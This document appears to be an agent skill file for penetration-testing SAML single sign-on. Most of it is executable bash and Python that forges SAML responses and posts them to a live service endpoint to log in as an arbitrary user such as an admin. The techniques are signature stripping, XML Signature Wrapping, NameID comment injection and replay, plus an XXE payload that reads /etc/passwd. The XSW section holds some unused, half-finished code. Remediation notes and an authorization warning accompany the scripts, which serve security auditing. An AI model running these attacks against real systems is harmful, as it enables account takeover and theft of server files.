---
name: web-vuln-saml-sso
description: SAML and SSO vulnerability detection including XML Signature Wrapping attacks
license: MIT
metadata:
  category: web-security
  locale: en
  phase: v1
---

## What this skill does

Detects vulnerabilities in SAML-based Single Sign-On implementations by intercepting and manipulating SAML responses. Tests for XML Signature Wrapping (XSW variants XSW1–XSW8), signature removal/stripping, NameID comment injection, SAML replay attacks, XXE in SAML responses, and Assertion Consumer Service (ACS) URL manipulation.

## When to use

- When auditing a web application that uses SAML 2.0 for authentication or federation
- When testing an Identity Provider (IdP) or Service Provider (SP) for SSO weaknesses
- When evaluating whether SAML signature validation can be bypassed to authenticate as an arbitrary user
- When checking for XML-level injection or replay vulnerabilities in SSO flows

## Prerequisites

- `curl` must be installed
- `base64` (GNU coreutils) must be available
- `xmllint` (from `libxml2-utils`) must be installed for XML parsing: `apt install libxml2-utils`
- Ability to intercept and replay SAML responses (browser proxy or captured assertion)
- A valid SAML response from a legitimate authentication flow

## Inputs

| Variable | Description | Example |
|----------|-------------|---------|
| `ACS_URL` | Assertion Consumer Service URL (SP endpoint that receives SAML response) | `https://sp.example.com/saml/acs` |
| `SAML_RESPONSE_B64` | Base64-encoded SAML response captured from a valid login | `PHNhbWxwOl...` |
| `TARGET_USER` | Username/email to impersonate in tests | `admin@example.com` |
| `LEGITIMATE_USER` | Username of the account used to obtain the real assertion | `user@example.com` |

## Workflow

### Step 1: Identify SAML endpoints and decode the response

```bash
ACS_URL="https://sp.example.com/saml/acs"
SAML_RESPONSE_B64="PHNhbWxwOl..."
TARGET_USER="admin@example.com"
LEGITIMATE_USER="user@example.com"

WORK_DIR=$(mktemp -d /tmp/saml_test_XXXXXX)
echo "[+] Working directory: $WORK_DIR"

# Decode and pretty-print the SAML response
echo "$SAML_RESPONSE_B64" | base64 -d > "$WORK_DIR/saml_original.xml"
xmllint --format "$WORK_DIR/saml_original.xml" > "$WORK_DIR/saml_pretty.xml" 2>/dev/null \
  || cp "$WORK_DIR/saml_original.xml" "$WORK_DIR/saml_pretty.xml"

echo "=== Step 1: SAML response structure ==="
grep -E "<(saml:|samlp:)?(Issuer|NameID|Conditions|AudienceRestriction|Audience|AuthnStatement|AttributeStatement|Signature)" \
  "$WORK_DIR/saml_pretty.xml" | head -20

echo ""
echo "[+] NameID value:"
grep -oP '(?<=<saml:NameID[^>]*>)[^<]+' "$WORK_DIR/saml_pretty.xml" | head -3
```

### Step 2: Test signature removal (signature stripping)

```bash
echo ""
echo "=== Step 2: Signature stripping ==="

# Remove the entire ds:Signature element and re-encode
python3 - "$WORK_DIR/saml_original.xml" "$TARGET_USER" <<'PYEOF'
import sys
import re
import base64

with open(sys.argv[1], 'rb') as f:
    xml = f.read().decode('utf-8')

target_user = sys.argv[2]

# Strip Signature block
stripped = re.sub(r'<(?:ds:)?Signature\b.*?</(?:ds:)?Signature>', '', xml, flags=re.DOTALL)

# Change NameID to target user
modified = re.sub(r'(<(?:saml:)?NameID[^>]*>)[^<]+(</(?:saml:)?NameID>)',
                  rf'\g<1>{target_user}\g<2>', stripped)

encoded = base64.b64encode(modified.encode('utf-8')).decode('utf-8')
print("[+] Signature-stripped payload (base64):")
print(encoded[:80] + "...")

with open('/tmp/saml_stripped_b64.txt', 'w') as f:
    f.write(encoded)
PYEOF

echo ""
echo "[+] Sending signature-stripped response to ACS..."
curl -s -X POST "$ACS_URL" \
  --data-urlencode "SAMLResponse@/tmp/saml_stripped_b64.txt" \
  --max-time 15 \
  -c "$WORK_DIR/cookies_stripped.txt" \
  -D "$WORK_DIR/headers_stripped.txt" \
  -o "$WORK_DIR/resp_stripped.html" \
  -L

echo "[Response headers]:"
grep -iE "^(HTTP|Location|Set-Cookie)" "$WORK_DIR/headers_stripped.txt" | head -10
echo "[!] If authenticated session cookie set for $TARGET_USER -> signature validation BYPASSED"
```

### Step 3: Test XML Signature Wrapping (XSW variants)

```bash
echo ""
echo "=== Step 3: XSW variants ==="

python3 - "$WORK_DIR/saml_original.xml" "$TARGET_USER" "$ACS_URL" "$WORK_DIR" <<'PYEOF'
import sys, re, base64, subprocess, os

with open(sys.argv[1], 'rb') as f:
    xml = f.read().decode('utf-8')

target = sys.argv[2]
acs_url = sys.argv[3]
work_dir = sys.argv[4]

def swap_nameid(xml_str, new_user):
    return re.sub(r'(<(?:saml:)?NameID[^>]*>)[^<]+(</(?:saml:)?NameID>)',
                  rf'\g<1>{new_user}\g<2>', xml_str)

def send_saml(label, payload, acs):
    encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    tmp = f'/tmp/xsw_{label}.txt'
    with open(tmp, 'w') as f:
        f.write(encoded)
    result = subprocess.run(
        ['curl', '-s', '-X', 'POST', acs,
         '--data-urlencode', f'SAMLResponse@{tmp}',
         '--max-time', '10',
         '-D', '-',
         '-L', '-o', '/dev/null'],
        capture_output=True, text=True
    )
    headers = result.stdout
    if 'set-cookie' in headers.lower() or '302' in headers or '200' in headers:
        status_line = [l for l in headers.split('\n') if l.startswith('HTTP')]
        print(f"  [{label}] -> {status_line[0].strip() if status_line else 'response received'}")
        if 'set-cookie' in headers.lower():
            print(f"  [!] Session cookie set -> possible XSW bypass")
    else:
        print(f"  [{label}] -> no session (likely blocked)")

sig_match = re.search(r'(<(?:ds:)?Signature\b.*?</(?:ds:)?Signature>)', xml, re.DOTALL)
sig_block = sig_match.group(1) if sig_match else ''
unsigned_assertion = swap_nameid(xml, target)

# XSW1: move signed assertion to Extensions, inject unsigned assertion as primary
xsw1 = xml.replace(
    '<samlp:Extensions>', '',
).replace(
    '</samlp:Extensions>', ''
)
print("Running XSW variants against ACS...")
# Representative XSW tests — full 8-variant automation requires a dedicated tool
xsw_variants = {
    'XSW1-sig-in-extensions': re.sub(
        r'(<samlp:Response[^>]*>)',
        r'\1<samlp:Extensions>' + sig_block + '</samlp:Extensions>',
        swap_nameid(xml, target)
    ),
    'XSW2-unsigned-before-signed': swap_nameid(xml, target).replace(
        sig_block, sig_block + swap_nameid(xml, target)
    ),
}

for label, payload in xsw_variants.items():
    try:
        send_saml(label, payload, acs_url)
    except Exception as e:
        print(f"  [{label}] error: {e}")

print("\n[Note] Full XSW1-XSW8 testing is best performed with SAMLRaider (Burp extension)")
print("  Reference: https://github.com/SAMLRaider/SAMLRaider")
PYEOF
```

### Step 4: Test NameID comment injection

```bash
echo ""
echo "=== Step 4: NameID comment injection ==="

python3 - "$WORK_DIR/saml_original.xml" "$TARGET_USER" "$LEGITIMATE_USER" "$ACS_URL" <<'PYEOF'
import sys, re, base64, subprocess

with open(sys.argv[1], 'rb') as f:
    xml = f.read().decode('utf-8')

target = sys.argv[2]
legit = sys.argv[3]
acs_url = sys.argv[4]

# Comment injection: NameID becomes target<!--comment-->@legit-domain
domain = legit.split('@')[-1] if '@' in legit else 'example.com'
injected_id = f"{target}<!--{legit}-->"

modified = re.sub(
    r'(<(?:saml:)?NameID[^>]*>)[^<]+(</(?:saml:)?NameID>)',
    rf'\g<1>{injected_id}\g<2>',
    xml
)

encoded = base64.b64encode(modified.encode('utf-8')).decode('utf-8')
with open('/tmp/saml_comment.txt', 'w') as f:
    f.write(encoded)

print(f"[+] Injected NameID: {injected_id}")
result = subprocess.run(
    ['curl', '-s', '-X', 'POST', acs_url,
     '--data-urlencode', 'SAMLResponse@/tmp/saml_comment.txt',
     '--max-time', '10', '-D', '-', '-L', '-o', '/dev/null'],
    capture_output=True, text=True
)
print("[Response headers]:")
for line in result.stdout.split('\n')[:15]:
    if line.strip():
        print(' ', line.strip())
print("\n[!] If session opened for target user -> comment injection bypasses SP NameID parsing")
PYEOF
```

### Step 5: Test SAML replay

```bash
echo ""
echo "=== Step 5: SAML replay ==="
echo "[+] Replaying the original (valid) SAML response a second time..."

curl -s -X POST "$ACS_URL" \
  --data-urlencode "SAMLResponse=$SAML_RESPONSE_B64" \
  --max-time 15 \
  -D "$WORK_DIR/headers_replay.txt" \
  -o "$WORK_DIR/resp_replay.html" \
  -L

echo "[Response headers]:"
grep -iE "^(HTTP|Location|Set-Cookie)" "$WORK_DIR/headers_replay.txt" | head -10
echo "[!] If new session created -> SP does not enforce one-time use of assertions (no NotOnOrAfter or InResponseTo check)"
```

### Step 6: Test XXE in SAML response

```bash
echo ""
echo "=== Step 6: XXE in SAML response ==="

XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
python3 - "$WORK_DIR/saml_original.xml" "$ACS_URL" "$XXE_PAYLOAD" <<'PYEOF'
import sys, base64, subprocess

with open(sys.argv[1], 'rb') as f:
    xml = f.read().decode('utf-8')

acs_url = sys.argv[2]
xxe_decl = sys.argv[3]

# Prepend XXE DOCTYPE and inject entity reference into Issuer
modified = xml.replace('<?xml version="1.0"?>', xxe_decl, 1)
modified = modified.replace('<?xml version="1.0" encoding="UTF-8"?>', xxe_decl, 1)

import re
modified = re.sub(r'(<(?:saml:)?Issuer[^>]*>)[^<]+(</(?:saml:)?Issuer>)',
                  r'\g<1>&xxe;\g<2>', modified, count=1)

encoded = base64.b64encode(modified.encode('utf-8')).decode('utf-8')
with open('/tmp/saml_xxe.txt', 'w') as f:
    f.write(encoded)

print("[+] Sending XXE-injected SAML response...")
result = subprocess.run(
    ['curl', '-s', '-X', 'POST', acs_url,
     '--data-urlencode', 'SAMLResponse@/tmp/saml_xxe.txt',
     '--max-time', '10'],
    capture_output=True, text=True
)
output = result.stdout
if 'root:' in output or '/bin/' in output:
    print("[CRITICAL] XXE file read successful - /etc/passwd contents found in response")
else:
    print("[+] Response (first 300 chars):", output[:300])
    print("[Note] XXE may be out-of-band; check Burp Collaborator / SSRF canary if no output")
PYEOF
```

### Step 7: Document findings

```bash
echo ""
echo "=== Step 7: Summary ==="
cat <<'EOF'
Severity guide:
  [CRITICAL] Signature stripping or XSW bypass -> arbitrary user impersonation / full authentication bypass
  [CRITICAL] XXE in SAML parser -> file read, SSRF, or remote code execution
  [HIGH]     NameID comment injection -> authenticate as privileged user
  [HIGH]     SAML replay accepted -> session hijack using stolen assertion
  [MEDIUM]   ACS URL not validated -> assertion forwarding to attacker-controlled endpoint
  [LOW]      Self-signed IdP certificate accepted without pinning -> MitM possible

Remediation:
  - Validate XML signature over the entire assertion, not just sub-elements
  - Enforce strict canonicalization (C14N) to prevent XSW
  - Use SAXParser in non-resolving mode to prevent XXE (disable external entities)
  - Record and reject reused assertion IDs (InResponseTo + NotOnOrAfter)
  - Strip XML comments before processing NameID
  - Whitelist valid ACS URLs in the SP configuration
  - Pin the IdP signing certificate; reject self-signed certs in production

Tools:
  - SAMLRaider (Burp Extension): https://github.com/SAMLRaider/SAMLRaider
  - SAML Raider CLI: https://github.com/CompassSecurity/SAMLRaider
  - PortSwigger SAML lab: https://portswigger.net/web-security/saml
EOF
```

## Done when

- SAML response is decoded and structure is inspected
- Signature stripping is attempted and SP response is evaluated
- At least 2 XSW variants are tested
- NameID comment injection is attempted
- SAML replay is tested
- XXE DOCTYPE injection is attempted
- Findings are classified by severity with remediation notes

## Failure modes

| Symptom | Cause | Solution |
|---------|-------|----------|
| ACS returns 400 immediately | SP validates XML schema before signature | Use `xmllint --noout` to verify XML is well-formed before sending |
| All modified assertions return generic error | SP has strict signature validation (good) | Confirm with XSW variants that require valid signature block to remain |
| `base64 -d` fails | SAML response may be URL-encoded | Run `python3 -c "import urllib.parse; print(urllib.parse.unquote('...'))"` first |
| `xmllint` not found | libxml2-utils not installed | `sudo apt install libxml2-utils` |
| Replay test always rejected | SP enforces NotOnOrAfter and InResponseTo | This is correct behavior; document as pass |

## Notes

- SAML responses are typically URL-encoded when captured from browser traffic; decode with `urllib.parse.unquote()` before base64 decoding.
- XSW attacks depend on the XPath expression the SP uses to extract the signed element; XSW1–XSW8 cover common XPath patterns.
- The SAMLRaider Burp extension automates all 8 XSW variants interactively and is the recommended tool for thorough testing.
- Never test against a production IdP/SP without explicit written authorization; replaying assertions may trigger account lockouts or audit alerts.
